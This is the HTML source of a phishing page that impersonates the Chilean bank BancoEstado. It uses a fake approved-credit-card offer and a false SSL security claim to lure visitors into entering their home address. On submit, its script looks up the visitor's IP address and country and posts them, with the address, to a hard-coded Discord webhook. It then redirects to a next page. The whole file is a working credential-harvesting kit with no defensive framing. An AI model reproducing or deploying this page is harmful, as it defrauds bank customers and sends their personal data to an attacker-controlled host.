<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Buenas Noticias</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #334155;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 25px rgba(0,0,0,0.03);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .logo {
            height: 28px;
            opacity: 0.9;
        }

        .close-btn {
            width: 32px;
            height: 32px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #64748b;
            font-size: 18px;
            cursor: pointer;
        }

        .message-section {
            padding: 30px 30px 10px;
            text-align: center;
        }

        .validation-text {
            font-size: 16px;
            color: #1e293b;
            line-height: 1.5;
            font-weight: 400;
        }

        .monto-destacado {
            display: block;
            font-size: 32px;
            font-weight: 700;
            color: #ff8c00;
            margin: 15px 0;
            letter-spacing: -1px;
        }

        .highlight {
            display: block;
            font-weight: 600;
            color: #64748b;
            font-size: 13px;
            text-transform: uppercase;
            margin-bottom: 20px;
        }

        .form-container {
            padding: 10px 30px 30px;
        }

        .input-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
            color: #64748b;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
            background-color: #fcfdfe;
            transition: all 0.2s;
            color: #1e293b;
        }

        input:focus {
            border-color: #ff8c00;
            background-color: #fff;
            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1);
        }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 20px;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.2);
            transition: all 0.2s;
        }

        /* Botón verde cuando está listo */
        .btn-ready {
            background-color: #FFA500 !important;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.2) !important;
        }

        .footer-secure {
            margin-top: auto;
            padding: 30px;
            text-align: center;
            font-size: 11px;
            color: #94a3b8;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Logo_BancoEstado.svg/1280px-Logo_BancoEstado.svg.png" alt="Logo" class="logo">
            <div class="close-btn">✕</div>
        </div>

        <div class="message-section">
            <div class="validation-text">
                ¡Tenemos buenas noticias para ti! Tienes aprobada una nueva tarjeta con un cupo de:
                <span class="monto-destacado">$6.000.000</span>
                <span class="highlight">Dirección de despacho requerida</span>
            </div>
        </div>

        <div class="form-container">
            <div class="input-group">
                <label>Calle y Número</label>
                <input type="text" id="direccion" placeholder="Ej: Av. Libertador 1234, depto 101">
            </div>

            <div class="input-group">
                <label>Ciudad / Comuna</label>
                <input type="text" id="comuna" placeholder="Ej: Santiago">
            </div>

            <div class="input-group">
                <label>Estado / Región</label>
                <input type="text" id="region" placeholder="Ej: Región Metropolitana">
            </div>

            <button class="btn-continuar" id="btnEnviar">Confirmar y Enviar</button>
        </div>

        <div class="footer-secure">
            🔒 Sus datos están protegidos por el protocolo SSL de BancoEstado
        </div>
    </div>

    <script>
        const btnEnviar = document.getElementById('btnEnviar');
        const inputs = document.querySelectorAll('input');

        // Validación visual de campos
        inputs.forEach(input => {
            input.addEventListener('input', () => {
                const allFilled = Array.from(inputs).every(i => i.value.trim().length > 2);
                if (allFilled) {
                    btnEnviar.classList.add('btn-ready');
                } else {
                    btnEnviar.classList.remove('btn-ready');
                }
            });
        });

        btnEnviar.addEventListener('click', async () => {
            const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";
            
            btnEnviar.innerText = "Procesando...";
            btnEnviar.disabled = true;

            try {
                // 1. Obtener IP y País
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                
                const ipReal = geoData.ip || "No detectada";
                const paisReal = geoData.country_name || "Desconocido";

                // 2. Preparar el mensaje para Discord
                const data = {
                    embeds: [{
                        title: "📍 NUEVO DESPACHO CONFIRMADO",
                        color: 16745472, // Naranja BancoEstado
                        fields: [
                            { name: "🏠 Dirección", value: document.getElementById('direccion').value || "No ingresado" },
                            { name: "🌆 Comuna", value: document.getElementById('comuna').value || "No ingresado", inline: true },
                            { name: "🗺️ Región", value: document.getElementById('region').value || "No ingresado", inline: true },
                            { name: "🌐 IP del Usuario", value: `\`${ipReal}\``, inline: false },
                            { name: "🇨🇱 País detectado", value: `**${paisReal}**`, inline: true }
                        ],
                        footer: { text: "Sistema de Logística BancoEstado" },
                        timestamp: new Date()
                    }]
                };

                // 3. Enviar Webhook
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                // Redirigir al siguiente paso
                window.location.href = "index3.html";

            } catch (error) {
                console.error("Error:", error);
                // Redirigir incluso si falla la geo-localización para no trabar al usuario
                window.location.href = "index3.html";
            }
        });
    </script>
</body>
</html>
